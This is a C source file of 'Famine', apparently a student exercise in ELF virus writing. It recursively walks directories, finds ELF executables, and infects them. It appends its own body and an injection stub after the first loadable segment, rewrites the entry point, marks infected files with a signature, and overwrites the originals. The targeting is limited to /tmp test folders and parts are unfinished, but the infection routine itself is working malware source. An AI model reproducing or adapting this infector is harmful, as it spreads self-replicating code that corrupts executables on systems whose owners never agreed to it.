#include "famine.h"

int			get_size_needed(t_elf *elf, t_elf *virus_elf)
{
	Elf64_Phdr	*next;
	int		diff;

	//TODO: gérer si pas de next (aka inject.o -> inject SGF)
	next = elf->pt_load + 1;
	diff = ((virus_elf->size + INJECT_SIZE) - (next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz)));
	return (diff);
}

void	add_injection(void **dst, t_elf *elf, uint64_t entry_inject, uint64_t entry_infect)
{

	ft_memcpy(*dst, INJECT, INJECT_SIZE - (sizeof(uint64_t) * 4));
	*dst += INJECT_SIZE - (sizeof(uint64_t) * 4);
	#ifdef DEBUG
		ft_putstr("INJECTION: \n");
		ft_putstr("vaddr: 0x");
		ft_puthexa(elf->pt_load->p_vaddr);
		ft_putstr("\nentry_inject: 0x");
		ft_puthexa(entry_inject);
		ft_putstr("\nentry_prg: 0x");
		ft_puthexa(elf->header->e_entry);
		ft_putstr("\nentry_infect: 0x");
		ft_puthexa(entry_infect);
		ft_putstr("\n");
	#endif
	ft_memcpy(*dst + sizeof(uint64_t) * 0, &elf->pt_load->p_vaddr, sizeof(uint64_t));
	ft_memcpy(*dst + sizeof(uint64_t) * 1, &entry_inject, sizeof(uint64_t));
	ft_memcpy(*dst + sizeof(uint64_t) * 2, &elf->header->e_entry, sizeof(uint64_t));
	ft_memcpy(*dst + sizeof(uint64_t) * 3, &entry_infect, sizeof(uint64_t));
	*dst += sizeof(uint64_t) * 4;
}

void	create_infection(void *dst, t_elf *elf, t_elf *virus_elf, int nb_zero)
{
	uint64_t	new_entry;
	uint64_t	entry_infect;
	void		*src;
	void		*end;

	src = elf->addr;
	end = src + elf->size;
	ft_memcpy(dst, src, (unsigned long)&elf->header->e_entry - (unsigned long)src);
	dst += (unsigned long)&elf->header->e_entry - (unsigned long)src;
	src = &elf->header->e_entry;
	new_entry = elf->pt_load->p_offset + elf->pt_load->p_filesz + virus_elf->size;
	entry_infect = elf->pt_load->p_offset + elf->pt_load->p_filesz + (virus_elf->header->e_entry - virus_elf->pt_load->p_vaddr);
	ft_memcpy(dst, &new_entry, sizeof(elf->header->e_entry));
	dst += sizeof(elf->header->e_entry);
	src += sizeof(elf->header->e_entry);
	src = add_padding_segments(elf, virus_elf, src, &dst, nb_zero);
	int pt_load_size_left = ((unsigned long)elf->addr + elf->pt_load->p_offset + elf->pt_load->p_filesz) - (unsigned long)src;
	ft_memcpy(dst, src, pt_load_size_left);
	dst += pt_load_size_left;
	src += pt_load_size_left;
	ft_memcpy(dst, virus_elf->addr, virus_elf->size);
	dst += virus_elf->size;
	add_injection(&dst, elf, new_entry, entry_infect);
	ft_memset(dst, 0, nb_zero);
	dst += nb_zero;
	// TODO: fix for thin files like inject
	src += (virus_elf->size + INJECT_SIZE) - get_size_needed(elf, virus_elf);
	src = add_padding_sections(elf, virus_elf, src, &dst, nb_zero);
	ft_memcpy(dst, src, (unsigned long)end - (unsigned long)src);
}

void	try_open_file(t_elf *virus_elf, char *file)
{
	int				ret;
	int				fd;
	t_elf			elf;
	void			*header[64];

	fd = syscall_open(file, O_RDWR);
	if (fd > 0)
	{
		ret = read(fd, header, 64);
		if (ret >= 0)
		{
			ret = check_magic_elf(header);
			if (ret == ET_EXEC || ret == ET_DYN)
			{
				ret = 0;
				elf.filename = file;
				elf.size = lseek(fd, (size_t)0, SEEK_END);
				if (elf.size < 0 ||
(elf.addr = syscall_mmap(NULL, elf.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
				{
					syscall_close(fd);
					#ifdef DEBUG
						debug_print_error(0, virus_elf->filename, file);
					#endif
					return ;
				}
				if (!memmem(elf.addr, elf.size, SIGNATURE, ft_strlen(SIGNATURE)))
				{
					if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
					{
						syscall_munmap(elf.addr, elf.size);
						syscall_close(fd);
						#ifdef DEBUG
							debug_print_error(ret, virus_elf->filename, file);
						#endif
						return ;
					}
					int		size_needed = get_size_needed(&elf, virus_elf);
					int		nb_zero_to_add = PAGE_SIZE - (size_needed % PAGE_SIZE);
					/*
					#ifdef DEBUG
						printf("previous size: %ld\n", elf.size);
						printf("size injection: %ld\n", virus_elf->size);
						printf("size_needed: %d\n", size_needed);
						printf("nb_zero_to_add: %d\n", nb_zero_to_add);
						printf("total addition: %d\n", size_needed + nb_zero_to_add);
						printf("final size: %ld\n", elf.size + size_needed + nb_zero_to_add);
					#endif
					*/
					char	*new;
					new = syscall_mmap(NULL, elf.size + size_needed + nb_zero_to_add, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
					if (!new)
					{
						syscall_munmap(elf.addr, elf.size);
						syscall_close(fd);
						#ifdef DEBUG
							debug_print_error(ret, virus_elf->filename, file);
						#endif
						return ;
					}
					create_infection(new, &elf, virus_elf, nb_zero_to_add);
					syscall_munmap(elf.addr, elf.size);
					syscall_close(fd);
					fd = syscall_open(file, O_TRUNC | O_WRONLY);
					if (fd < 0)
						return ;
					write(fd, new, elf.size + size_needed + nb_zero_to_add);
					syscall_munmap(new, elf.size + size_needed + nb_zero_to_add);
				}
				#ifdef DEBUG
				else
				{
					ft_putstr(file);
					ft_putstr(" already infected.\n");
				}
				#endif
			}
		}
		#ifdef DEBUG
		else
			debug_print_error(ret, virus_elf->filename, file);
		#endif
		syscall_close(fd);
	}
}

void	moving_through_path(t_elf *virus_elf, char *path, char *d_name)
{
	char			new_path[ft_strlen(path) + ft_strlen(d_name) + 2];
	char			buffer[1024];
	struct stat		statbuf;
	int				fd;

	ft_strcpy(new_path, path);
	if (strlen(d_name))
		ft_strcat(new_path, "/");
	ft_strcat(new_path, d_name);
	syscall_stat(new_path, &statbuf);
	if ((statbuf.st_mode & S_IFMT) == S_IFDIR)
	{
		fd =  syscall_open(new_path, O_RDONLY | O_DIRECTORY);
		if (fd > 0)
		{
			int		nread;
			int		rest;
			rest = 0;
			while ((nread = syscall_getdents(fd, (struct linux_dirent *)(buffer + rest), 1024 - rest)) > 0)
			{
				long					bpos;
				struct linux_dirent		*linux_dir;
				#ifdef DEBUG
					ft_putstr("-> ");
					ft_putstr(new_path);
					ft_putstr("\n");
				#endif
				for (bpos = 0; bpos < nread;)
				{
					linux_dir = (void *)buffer + bpos;
					if (bpos + linux_dir->d_reclen > nread)
					{
						rest = linux_dir->d_reclen;
						ft_memcpy(buffer, buffer + bpos, 1024 - bpos);
					}
					bpos += linux_dir->d_reclen;
					//else
					//	
				}
				for (bpos = 0; bpos < nread;)
				{
					linux_dir = (void *)buffer + bpos;
					if (ft_strcmp(linux_dir->d_name, ".") && ft_strcmp(linux_dir->d_name, ".."))
						moving_through_path(virus_elf, new_path, linux_dir->d_name);
					bpos += linux_dir->d_reclen;
				}
			}
			//printf("nread %d\n", nread);
		}
		syscall_close(fd);
	}
	else
	{
		//printf("%s: %d\n", new_path, statbuf.st_mode);
		try_open_file(virus_elf, new_path);
	}
}

int		main(int argc, char *argv[])
{
	int		fd;
	int		ret;
	t_elf	elf;

	ret = 0;
	#ifdef DEBUG
		debug_print_args(argc, argv);
	#endif
	fd = syscall_open(argv[0], O_RDONLY);
	if (fd > 0)
	{
		/* TODO: Original infection
			Copy the whole file
		*/
		if (!ft_strcmp(basename(argv[0]), "Famine"))
		{
			elf.filename = argv[0];
			elf.size = syscall_lseek(fd, (size_t)0, SEEK_END);
			if (elf.size < 0 ||
	(elf.addr = syscall_mmap(NULL, elf.size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
			{
				syscall_close(fd);
				#ifdef DEBUG
					debug_print_error(0, argv[0], argv[0]);
				#endif
				return (1);
			}
			if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
			{
				syscall_munmap(elf.addr, elf.size);;
				syscall_close(fd);
				#ifdef DEBUG
					debug_print_error(0, argv[0], argv[0]);
				#endif
				return (1);
			}
			moving_through_path(&elf, "/tmp/test", "");
			moving_through_path(&elf, "/tmp/test2", "");
			syscall_munmap(elf.addr, elf.size);
			syscall_close(fd);
		}
		else
			syscall_write(STDOUT_FILENO, "Host\n", 5);
		// TODO: Host infection
	}
	#ifdef DEBUG
	else
		debug_print_error(0, argv[0], argv[0]);
	#endif
	syscall_exit(0);
	return (0);
}
